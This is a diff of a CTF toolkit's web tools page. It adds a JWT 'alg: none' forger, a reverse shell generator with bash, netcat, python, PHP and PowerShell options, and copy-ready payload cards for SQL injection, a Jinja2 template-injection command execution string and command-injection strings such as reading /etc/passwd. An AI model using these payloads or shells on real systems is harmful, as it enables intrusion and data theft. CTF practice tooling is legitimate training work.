@@ -3,35 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Tools - CTF Toolkit</title>
+    <title>Web Security Tools | CTF Toolkit</title>
     <link rel="stylesheet" href="../css/style.css">
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>🌐 Web Tools</h1>
-            <p>Tools for web exploitation and analysis</p>
+            <div class="header-badge">
+                <span class="badge-dot"></span>
+                <span>WEB EXPLOITATION MODULE</span>
+            </div>
+            <h1>
+                <span class="terminal-prefix">&gt;</span>
+                <span>Web Security Tools</span>
+            </h1>
+            <p>JWT token inspection, header auditing, reverse shell payload generation, and attack references.</p>
         </header>
 
         <nav class="main-nav">
             <a href="../index.html" class="nav-item">
-                <span class="icon">🏠</span>
+                <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
                 <span>Home</span>
             </a>
             <a href="crypto.html" class="nav-item">
-                <span class="icon">🔐</span>
+                <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                 <span>Cryptography</span>
             </a>
             <a href="encoding.html" class="nav-item">
-                <span class="icon">🔤</span>
+                <svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
                 <span>Encoding</span>
             </a>
             <a href="web.html" class="nav-item active">
-                <span class="icon">🌐</span>
+                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
                 <span>Web Tools</span>
             </a>
             <a href="misc.html" class="nav-item">
-                <span class="icon">🛠️</span>
+                <svg viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path></svg>
                 <span>Miscellaneous</span>
             </a>
         </nav>
@@ -39,115 +46,239 @@
         <main>
             <!-- JWT Decoder -->
             <section class="tool-section">
-                <h2>JWT Decoder</h2>
+                <div class="tool-section-header">
+                    <h2>
+                        <span>JWT Inspector &amp; Forger</span>
+                        <span class="section-tag">RFC 7519 / alg: none</span>
+                    </h2>
+                </div>
                 <div class="tool-input">
-                    <label for="jwtInput">JWT Token:</label>
-                    <textarea id="jwtInput" placeholder="Paste your JWT token here..."></textarea>
+                    <label for="jwtInput">JWT Token</label>
+                    <textarea id="jwtInput" placeholder="Paste your JWT token here (header.payload.signature)..."></textarea>
                 </div>
                 <div class="tool-buttons">
                     <button class="btn" onclick="decodeJWT()">Decode JWT</button>
-                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('jwtInput', 'jwtHeader', 'jwtPayload', 'jwtSignature')">Clear</button>
+                    <button class="btn btn-secondary" onclick="forgeJWTNoneAlg()">Forge alg: none Token</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('jwtInput', 'jwtHeader', 'jwtPayload', 'jwtSignature', 'jwtForgedOutput'); ctfToolkit.toggleOutput('jwtOutputSection', false); ctfToolkit.toggleOutput('jwtForgedSection', false); const w = document.querySelector('.jwt-warnings'); if (w) w.remove();">Clear</button>
                 </div>
                 <div id="jwtOutputSection" class="output-section hidden">
-                    <h3>Decoded JWT:</h3>
+                    <div class="output-header">
+                        <h3>Decoded JWT Structure</h3>
+                    </div>
                     <div class="jwt-parts">
                         <div class="jwt-part">
-                            <h4>Header:</h4>
+                            <div class="jwt-part-header">
+                                <h4>Header (JOSE)</h4>
+                                <button class="btn copy-btn btn-sm" data-target="jwtHeader">
+                                    <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                    <span>Copy</span>
+                                </button>
+                            </div>
                             <div id="jwtHeader" class="output-content"></div>
-                            <button class="btn copy-btn" data-target="jwtHeader">Copy Header</button>
                         </div>
                         <div class="jwt-part">
-                            <h4>Payload:</h4>
+                            <div class="jwt-part-header">
+                                <h4>Payload (Claims)</h4>
+                                <button class="btn copy-btn btn-sm" data-target="jwtPayload">
+                                    <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                    <span>Copy</span>
+                                </button>
+                            </div>
                             <div id="jwtPayload" class="output-content"></div>
-                            <button class="btn copy-btn" data-target="jwtPayload">Copy Payload</button>
                         </div>
                         <div class="jwt-part">
-                            <h4>Signature:</h4>
+                            <div class="jwt-part-header">
+                                <h4>Signature</h4>
+                                <button class="btn copy-btn btn-sm" data-target="jwtSignature">
+                                    <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                    <span>Copy</span>
+                                </button>
+                            </div>
                             <div id="jwtSignature" class="output-content"></div>
-                            <button class="btn copy-btn" data-target="jwtSignature">Copy Signature</button>
                         </div>
                     </div>
+                </div>
+                <div id="jwtForgedSection" class="output-section hidden">
+                    <div class="output-header">
+                        <h3>Forged alg: none Token</h3>
+                        <button class="btn copy-btn btn-sm" data-target="jwtForgedOutput">
+                            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            <span>Copy Token</span>
+                        </button>
+                    </div>
+                    <div id="jwtForgedOutput" class="output-content"></div>
                 </div>
             </section>
 
             <!-- Cookie Parser -->
             <section class="tool-section">
-                <h2>Cookie Parser</h2>
+                <div class="tool-section-header">
+                    <h2>
+                        <span>Cookie Parser</span>
+                        <span class="section-tag">Key-Value &amp; Payload Inspection</span>
+                    </h2>
+                </div>
                 <div class="tool-input">
-                    <label for="cookieInput">Cookie String:</label>
-                    <textarea id="cookieInput" placeholder="Paste cookie string (e.g., name1=value1; name2=value2)..."></textarea>
+                    <label for="cookieInput">Cookie String</label>
+                    <textarea id="cookieInput" placeholder="Paste cookie string (e.g. session=eyJ...; token=abc%3D%3D)..."></textarea>
                 </div>
                 <div class="tool-buttons">
                     <button class="btn" onclick="parseCookies()">Parse Cookies</button>
-                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('cookieInput', 'cookieOutput')">Clear</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('cookieInput', 'cookieOutput'); ctfToolkit.toggleOutput('cookieOutputSection', false)">Clear</button>
                 </div>
                 <div id="cookieOutputSection" class="output-section hidden">
-                    <h3>Parsed Cookies:</h3>
+                    <div class="output-header">
+                        <h3>Parsed Cookies</h3>
+                        <button class="btn copy-btn btn-sm" data-target="cookieOutput">
+                            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            <span>Copy</span>
+                        </button>
+                    </div>
                     <div id="cookieOutput" class="output-content"></div>
-                    <button class="btn copy-btn" data-target="cookieOutput">Copy</button>
                 </div>
             </section>
 
             <!-- HTTP Headers Analyzer -->
             <section class="tool-section">
-                <h2>HTTP Headers Analyzer</h2>
+                <div class="tool-section-header">
+                    <h2>
+                        <span>HTTP Headers Analyzer</span>
+                        <span class="section-tag">Security Posture Audit</span>
+                    </h2>
+                </div>
                 <div class="tool-input">
-                    <label for="headersInput">HTTP Headers:</label>
-                    <textarea id="headersInput" placeholder="Paste HTTP headers here..."></textarea>
+                    <label for="headersInput">HTTP Headers</label>
+                    <textarea id="headersInput" placeholder="Paste raw HTTP response headers here..."></textarea>
                 </div>
                 <div class="tool-buttons">
                     <button class="btn" onclick="analyzeHeaders()">Analyze Headers</button>
-                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('headersInput', 'headersOutput')">Clear</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('headersInput', 'headersOutput'); ctfToolkit.toggleOutput('headersOutputSection', false)">Clear</button>
                 </div>
                 <div id="headersOutputSection" class="output-section hidden">
-                    <h3>Analysis:</h3>
+                    <div class="output-header">
+                        <h3>Audit Analysis</h3>
+                        <button class="btn copy-btn btn-sm" data-target="headersOutput">
+                            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            <span>Copy</span>
+                        </button>
+                    </div>
                     <div id="headersOutput" class="output-content"></div>
-                    <button class="btn copy-btn" data-target="headersOutput">Copy</button>
                 </div>
             </section>
 
-            <!-- SQL Injection Cheat Sheet -->
+            <!-- Reverse Shell Generator -->
             <section class="tool-section">
-                <h2>SQL Injection Cheat Sheet</h2>
-                <div class="cheat-sheet">
-                    <h4>Authentication Bypass</h4>
-                    <code>' OR '1'='1</code>
-                    <code>' OR '1'='1' --</code>
-                    <code>' OR '1'='1' #</code>
-                    <code>admin' --</code>
-                    <code>admin' #</code>
-                    <code>admin'/*</code>
-                    
-                    <h4>Union-based SQL Injection</h4>
-                    <code>' UNION SELECT NULL--</code>
-                    <code>' UNION SELECT NULL,NULL--</code>
-                    <code>' UNION SELECT NULL,NULL,NULL--</code>
-                    <code>' UNION SELECT 1,2,3--</code>
-                    
-                    <h4>Error-based SQL Injection</h4>
-                    <code>' AND 1=CONVERT(int, @@version)--</code>
-                    <code>' AND 1=CAST(@@version AS int)--</code>
-                    
-                    <h4>Boolean-based Blind SQL Injection</h4>
-                    <code>' AND 1=1--</code>
-                    <code>' AND 1=2--</code>
-                    <code>' AND SUBSTRING(@@version,1,1)='M'--</code>
-                    
-                    <h4>Time-based Blind SQL Injection</h4>
-                    <code>' AND SLEEP(5)--</code>
-                    <code>' AND BENCHMARK(1000000,MD5('A'))--</code>
-                    <code>'; WAITFOR DELAY '00:00:05'--</code>
-                    
-                    <h4>Database Enumeration</h4>
-                    <code>' UNION SELECT schema_name FROM information_schema.schemata--</code>
-                    <code>' UNION SELECT table_name FROM information_schema.tables--</code>
-                    <code>' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--</code>
+                <div class="tool-section-header">
+                    <h2>
+                        <span>Reverse Shell Generator</span>
+                        <span class="section-tag">One-Liner Payloads</span>
+                    </h2>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1rem;">
+                    <div class="tool-input">
+                        <label for="shellIp">Listener IP</label>
+                        <input type="text" id="shellIp" value="10.10.14.1" placeholder="e.g. 10.10.14.1">
+                    </div>
+                    <div class="tool-input">
+                        <label for="shellPort">Listener Port</label>
+                        <input type="number" id="shellPort" value="4444" placeholder="e.g. 4444">
+                    </div>
+                    <div class="tool-input">
+                        <label for="shellType">Payload Platform</label>
+                        <select id="shellType">
+                            <option value="bash">Bash (-i /dev/tcp)</option>
+                            <option value="bash-read">Bash (read line 5&lt;&gt;)</option>
+                            <option value="nc-mkfifo">Netcat (mkfifo)</option>
+                            <option value="nc-e">Netcat (-e /bin/bash)</option>
+                            <option value="python3">Python 3 (PTY spawn)</option>
+                            <option value="php">PHP (fsockopen exec)</option>
+                            <option value="powershell">PowerShell (TCPClient)</option>
+                            <option value="socat">Socat (PTY)</option>
+                            <option value="node">Node.js (child_process)</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="tool-buttons">
+                    <button class="btn" onclick="generateReverseShell()">Generate Reverse Shell</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('shellOutput'); ctfToolkit.toggleOutput('shellOutputSection', false)">Clear</button>
+                </div>
+                <div id="shellOutputSection" class="output-section hidden">
+                    <div class="output-header">
+                        <h3>Generated Payload</h3>
+                        <button class="btn copy-btn btn-sm" data-target="shellOutput">
+                            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            <span>Copy Payload</span>
+                        </button>
+                    </div>
+                    <div id="shellOutput" class="output-content"></div>
+                </div>
+            </section>
+
+            <!-- SQL Injection & Web Cheat Sheet -->
+            <section class="tool-section">
+                <div class="tool-section-header">
+                    <h2>
+                        <span>Web Exploitation Cheat Sheet</span>
+                        <span class="section-tag">Quick Copy Vectors</span>
+                    </h2>
+                </div>
+
+                <div class="cheat-sheet-category">
+                    <h4>SQL Injection Authentication Bypass</h4>
+                    <div class="payload-card">
+                        <code>' OR '1'='1</code>
+                        <button class="btn copy-btn btn-sm" data-payload="' OR '1'='1">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>' OR '1'='1' -- -</code>
+                        <button class="btn copy-btn btn-sm" data-payload="' OR '1'='1' -- -">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>admin' --</code>
+                        <button class="btn copy-btn btn-sm" data-payload="admin' --">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>' UNION SELECT NULL,NULL,NULL-- -</code>
+                        <button class="btn copy-btn btn-sm" data-payload="' UNION SELECT NULL,NULL,NULL-- -">Copy</button>
+                    </div>
+                </div>
+
+                <div class="cheat-sheet-category">
+                    <h4>Server-Side Template Injection (SSTI)</h4>
+                    <div class="payload-card">
+                        <code>{{7*7}}</code>
+                        <button class="btn copy-btn btn-sm" data-payload="{{7*7}}">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>${7*7}</code>
+                        <button class="btn copy-btn btn-sm" data-payload="${7*7}">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}</code>
+                        <button class="btn copy-btn btn-sm" data-payload="{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}">Copy</button>
+                    </div>
+                </div>
+
+                <div class="cheat-sheet-category">
+                    <h4>Command Injection Bypasses</h4>
+                    <div class="payload-card">
+                        <code>;cat$IFS/etc/passwd</code>
+                        <button class="btn copy-btn btn-sm" data-payload=";cat$IFS/etc/passwd">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>|id</code>
+                        <button class="btn copy-btn btn-sm" data-payload="|id">Copy</button>
+                    </div>
+                    <div class="payload-card">
+                        <code>`id`</code>
+                        <button class="btn copy-btn btn-sm" data-payload="`id`">Copy</button>
+                    </div>
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>CTF Toolkit v1.0 | Made by AditSinX for CTF enthusiasts</p>
+            <p>CTF Toolkit v2.0 | Engineered for security researchers and CTF competitors.</p>
         </footer>
     </div>
 
